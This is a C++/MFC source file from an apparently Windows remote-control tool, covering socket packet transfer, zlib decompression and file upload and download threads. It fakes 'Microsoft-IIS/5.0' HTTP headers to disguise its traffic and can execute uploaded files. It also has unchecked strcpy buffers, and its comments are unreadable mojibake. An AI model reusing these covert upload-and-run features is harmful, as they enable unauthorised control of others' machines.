#include "stdafx.h"
#include "PcFile.h"
#include "zlib.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


//�ͻ��������ݴ���
void TransBagThread(LPVOID lPvoid)
{
	LPCLIENTDATA pData = (LPCLIENTDATA) lPvoid;

	//���ݴ���
	if(!SendBag(pData->m_SendSocket,pData->m_TransData,
		pData->m_TransLen,pData->m_Command) ||
		!ReadBag(pData->m_RecvSocket,pData->m_TransData,
		pData->m_TransLen,pData->m_Command))
	{
		//���ݴ���ʧ��
		pData->m_Command = TRANS_DATA_ERR;
		SetEvent(pData->m_WorkEvent);
		return ;
	}
	
	//�鿴��������
	if(pData->m_TransLen == 0)
	{
		//�޻ش�����
		SetEvent(pData->m_WorkEvent);
		return ;
	}

	//��ѹ������
	DWORD m_TmpLen = pData->m_TransLen;
	BYTE* pTmpData = new BYTE[m_TmpLen];
	memcpy(pTmpData,pData->m_TransData,m_TmpLen);
	pData->m_TransLen = TRAN_DATA_LEN;
	uncompress((LPBYTE) pData->m_TransData,
		&pData->m_TransLen,pTmpData,m_TmpLen);
	delete [] pTmpData;
	SetEvent(pData->m_WorkEvent);
}

BOOL WaitForTrans(HANDLE m_WaitEvent, HWND hWnd)
{
	MSG  msg; 
	while (1) 
	{ 
		if(WaitForSingleObject(m_WaitEvent,1) 
			!= WAIT_TIMEOUT)
			break;
	
		while(PeekMessage(&msg, NULL,  0, 0, PM_REMOVE)) 
		{ 
			if(msg.message == WM_CHAR && msg.wParam == 'q')
			{
				return FALSE;
			}

			//������Ϣ
			if(((msg.message<WM_MOUSEFIRST) ||
				(msg.message > WM_MOUSELAST)) &&
				(!AfxGetApp()->PreTranslateMessage(&msg) &&
				msg.message != WM_TIMER))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		} 
	} 
	return TRUE;
}

//�������һ�ο�������
BOOL ProcessOneTrans(LPCLIENTDATA pData)
{
	if(pData->m_IsWork) return FALSE;

	//��������ִ���߳�
	pData->m_IsWork = TRUE;
	PostMessage(pData->hParent,WM_SETMYCURSOR,(WPARAM) TRUE,NULL);
	ResetEvent(pData->m_WorkEvent);
	_beginthread(TransBagThread, 0, pData);

	//�ȴ��������
	if(!WaitForTrans(pData->m_WorkEvent,pData->hParent) ||
		pData->m_Command == TRANS_DATA_ERR)
	{
		pData->m_IsWork = FALSE;
		pData->m_TransLen = 0;
		return FALSE;
	}

	//����ִ�гɹ�
	PostMessage(pData->hParent,WM_SETMYCURSOR,(WPARAM) FALSE,NULL);
	pData->m_IsWork = FALSE;
	return TRUE;
}

//��������
BOOL SendData(SOCKET s, char *data, int len)
{
	char * p = data;
	int i = 0;
	int k = len;
	int ret = 0;

	if(len <= 0) return TRUE;
	while(1)
	{
		ret = send(s,p,k,0);
		if(ret == 0 || ret == SOCKET_ERROR)
		{
			TRACE("SendData OUT,%d\n",WSAGetLastError());
			return FALSE;
		}
		i += ret;
		p += ret;
		k -= ret;
		if(i >= len) break;
	}
	return TRUE;
}

//��������
BOOL RecvData(SOCKET s, char *data, int len)
{
	char * p = data;
	int i = 0;
	int k = len;
	int ret = 0;

	if(len <= 0) return TRUE;
	while(1)
	{
		ret = recv(s,p,k,0);
		if(ret == 0 || ret == SOCKET_ERROR)
		{
			TRACE("RecvData OUT,%d\n",WSAGetLastError());
			return FALSE;
		}
		i += ret;
		p += ret;
		k -= ret;
		if(i >= len) return TRUE;
	}
	return TRUE;
}

BOOL ReadBag(SOCKET s, char *Data,DWORD &len,UINT &command)
{
	//��������
	if(!RecvData(s, (char*) &command, sizeof(UINT)))
		return FALSE;

	//���ճ���
	if(!RecvData(s, (char*) &len, sizeof(DWORD)))
		return FALSE;

	TRACE("ReadBag : len = %d,command = %d\n",len,command);

	//�鿴���ݳ���
	if(len <= 0) return TRUE;

	//��������
	if(!RecvData(s, Data, len)) return FALSE;

	return TRUE;
}

BOOL SendBag(SOCKET s, char *Data, DWORD &len,UINT &command)
{
	//��������
	if(!SendData(s, (char*) &command, sizeof(UINT)))
		return FALSE;

	//���ͳ���
	if(!SendData(s, (char*) &len, sizeof(DWORD)))
		return FALSE;

	TRACE("SendBag : len = %d,command = %d\n",len,command);

	//�鿴���ݳ���
	if(len <= 0) return TRUE;

	//��������
	if(!SendData(s, Data, len)) return FALSE;

	return TRUE;
}

void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen)
{
	int i, j;

		for(i = 0; i < BcdStrLen; i++)
		{
			j = (BcdStr[i] >> 4) & 0x0f;
                	
			if(j > 9)
				AscStr[2 * i] = j + 'A' - 10;
			else
				AscStr[2 * i] = j + '0';

			j = BcdStr[i] & 0x0f;

			if(j > 9)
				AscStr[2 * i + 1 ] = j + 'A' - 10;
			else
				AscStr[2 * i + 1] = j + '0';

		}

}

void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen)
{
	
	int i, j, k;

		for(i = 0; i < AscStrLen; i++)
		{
        	
			if( ( AscStr[i] >= '0' ) && ( AscStr[i] <= '9' ) )

				j = AscStr[i] - '0';

			else if ( ( AscStr[i] >= 'a' ) && ( AscStr[i] <= 'z' ) )

				j = AscStr[i] - 'a' + 0x0a;

			else 

				j = AscStr[i] - 'A' + 0x0a;

			i++;

			if( ( AscStr[i] >= '0' ) && ( AscStr[i] <= '9' ) )

				k = AscStr[i] - '0';

			else if ( ( AscStr[i] >= 'a' ) && ( AscStr[i] <= 'z' ) )

				k = AscStr[i] - 'a' + 0x0a;

			else

				k = AscStr[i] - 'A' + 0x0a;

			BcdStr[i / 2] = (j << 4) | k;

		}
} 

BOOL MakeFilePath(char *pathName)
{
	char m_TmpStr[100] = {0};		
	char *pr = NULL;							
	char *ps = NULL;
	int  nLenth = 0;
	
	char m_Path[256] = {0};
	strcpy(m_Path, pathName);

	//�鿴�Ƿ�Ϊ�ļ�
	char* pFind = strchr(m_Path, '.');
	if(pFind != NULL)
	{
		pFind = strrchr(m_Path, '\\');
		if(pFind != NULL)
		{
			*pFind = 0;
		}
	}

	//Ŀ¼�Ѿ�����
	CFileStatus m_FileStatus;
	if(CFile::GetStatus(m_Path,m_FileStatus))
		return TRUE;

	//��ʼ��ָ��
	ps = m_Path;
	nLenth = strlen(m_Path);
	while(1)
	{
		pr = strchr(ps,'\\');
		if(pr == NULL)
		{
			//ֻ��һ��Ŀ¼
			pr = ps + strlen(ps) ;
		}
		int len = pr - m_Path;
		memcpy(m_TmpStr,m_Path,len);
		if(len>3)  
		{
			//������ǰĿ¼
			m_TmpStr[len] = '\0';
			CreateDirectory(m_TmpStr,NULL);
		}
		ps = pr+1;
		if(ps - m_Path >= nLenth)
		{
			//Ŀ¼�����걸
			break;
		}
	}
	//ȷ��������Ŀ¼�Ƿ����
	return CFile::GetStatus(m_Path,m_FileStatus);
}

bool SendClose(SOCKET s)
{
	char m_sCommand[512] = {0};
	char m_Strlen[256];
	strcpy(m_sCommand,"HTTP/1.1 200 OK\r\n");
	strcat(m_sCommand,"Server: Microsoft-IIS/5.0\r\n");
	CTime t = CTime::GetCurrentTime();
	sprintf(m_Strlen,"Date: %s GMT\r\n",
		t.FormatGmt ("%a, %d %b %Y %H:%M:%S"));
	strcat(m_sCommand,m_Strlen);
	sprintf(m_Strlen,"Content-Length: %d\r\n",0);
	strcat(m_sCommand,m_Strlen);
	strcat(m_sCommand,"Connection: Close\r\n");
	strcat(m_sCommand,"Cache-Control: no-cache\r\n\r\n");
	if(!SendData(s,m_sCommand,strlen(m_sCommand)))
	{
		closesocket(s);
		return false;
	}
	return true;
}

void UpFileExecThread(LPVOID lPvoid)
{
	SOCKET s = (SOCKET) lPvoid;

	//���հ�ͷ
	MYLISTFILEINFO m_FileInfo = {0};
	if(!RecvData(s,(char*) &m_FileInfo,sizeof(MYLISTFILEINFO)))
	{
		closesocket(s);
		return;
	}

	//����Ŀ¼
	MakeFilePath(m_FileInfo.m_LocalFile);

	//���ļ�
	FILE* fp = NULL;

	//�鿴�Ƿ���Ҫ�ƶ�ָ��
	if(m_FileInfo.m_FilePoint > 0)
	{
		fp = fopen(m_FileInfo.m_LocalFile,"r+b");
		if(fp == NULL || fseek(fp, m_FileInfo.m_FilePoint, SEEK_SET) != 0)
		{
			closesocket(s);
			if(fp != NULL) fclose(fp);
			SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
			return;
		}
		m_FileInfo.m_FileLen -= m_FileInfo.m_FilePoint;
	}
	else
	{
		fp = fopen(m_FileInfo.m_LocalFile,"wb");
		if(fp == NULL)
		{
			closesocket(s);
			SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
			return;
		}
	}	
	
	//��ʼ�ļ�����
	char m_FileBuf[8193] = {0};
	SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 2,(LPARAM) &m_FileInfo);
	while(m_FileInfo.m_FileLen > 0)
	{
		DWORD len = (m_FileInfo.m_FileLen > 8192) ? 
			8192 : m_FileInfo.m_FileLen;
		if(!RecvData(s,m_FileBuf,len))
		{
			closesocket(s);
			fclose(fp);
			SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
			return;
		}
		fwrite(m_FileBuf,len,1,fp);
		m_FileInfo.m_FileLen -= len;
		m_FileInfo.m_FilePoint += len;

		//�����ļ�״̬
		if(!IsWindow(m_FileInfo.hWnd) ||
			!SendMessage(m_FileInfo.hWnd,
			WM_TRANS_STATE, 1,(LPARAM) &m_FileInfo))
		{
			closesocket(s);
			fclose(fp);
			return;
		}
	}
	fclose(fp);

	SendClose(s);
	closesocket(s);

	//֪ͨ�Ի���ر�
	SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 0, (LPARAM) &m_FileInfo);

	//�����ļ�
	if(m_FileInfo.m_IsExec)
		ShellExecute(NULL,NULL,	m_FileInfo.m_LocalFile,NULL,NULL,SW_SHOW);
}

void DlFileExecThread(LPVOID lPvoid)
{
	SOCKET s = (SOCKET) lPvoid;

	//���հ�ͷ
	MYLISTFILEINFO m_FileInfo = {0};
	if(!RecvData(s,(char*) &m_FileInfo,sizeof(MYLISTFILEINFO)))
	{
		closesocket(s);
		return;
	}

	//���ļ�
	FILE* fp = fopen(m_FileInfo.m_LocalFile,"rb");
	if(fp == NULL)
	{
		closesocket(s);
		SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
		return;
	}

	//�鿴�Ƿ���Ҫ�ƶ�ָ��
	if(m_FileInfo.m_FilePoint > 0)
	{
		if(fseek(fp, m_FileInfo.m_FilePoint, SEEK_SET) != 0)
		{
			closesocket(s);
			fclose(fp);
			SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
			return;
		}
		m_FileInfo.m_FileLen -= m_FileInfo.m_FilePoint;
	}

	//���Ͱ�ͷ
	char m_Command[4096] = {0};
	char m_Strlen[1024];
	strcpy(m_Command,"HTTP/1.1 200 OK\r\n");
	strcat(m_Command,"Server: Microsoft-IIS/5.0\r\n");
	CTime t = CTime::GetCurrentTime();
	sprintf(m_Strlen,"Date: %s GMT\r\n",t.FormatGmt ("%a, %d %b %Y %H:%M:%S"));
	strcat(m_Command,m_Strlen);
	sprintf(m_Strlen,"Content-Length: %d\r\n",m_FileInfo.m_FileLen);
	strcat(m_Command,m_Strlen);
	strcat(m_Command,"Content-Type: *.*\r\n");
	strcat(m_Command,"Connection: Close\r\n");
	strcat(m_Command,"Cache-Control: no-cache\r\n\r\n");
	if(!SendData(s,m_Command,strlen(m_Command)))
	{
		closesocket(s);
		SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
		return;
	}

	//��ʼ�ļ�����
	SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 2,(LPARAM) &m_FileInfo);
	char m_FileBuf[8193] = {0};
	while(m_FileInfo.m_FileLen > 0)
	{
		DWORD len = (m_FileInfo.m_FileLen > 8192) ? 
			8192 : m_FileInfo.m_FileLen;

		//�����ļ�״̬
		if(!IsWindow(m_FileInfo.hWnd) ||
			!SendMessage(m_FileInfo.hWnd,
			WM_TRANS_STATE, 1,(LPARAM) &m_FileInfo))
		{
			closesocket(s);
			fclose(fp);
			return;
		}

		fread(m_FileBuf,len,1,fp);
		if(!SendData(s,m_FileBuf,len))
		{
			//����ʧ��
			closesocket(s);
			fclose(fp);
			SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 3, (LPARAM) &m_FileInfo);
			return;
		}

		m_FileInfo.m_FileLen -= len;
		m_FileInfo.m_FilePoint += len;
	}
	fclose(fp);
	closesocket(s);

	//֪ͨ�������
	SendMessage(m_FileInfo.hWnd,WM_TRANS_STATE, 0, (LPARAM) &m_FileInfo);
}

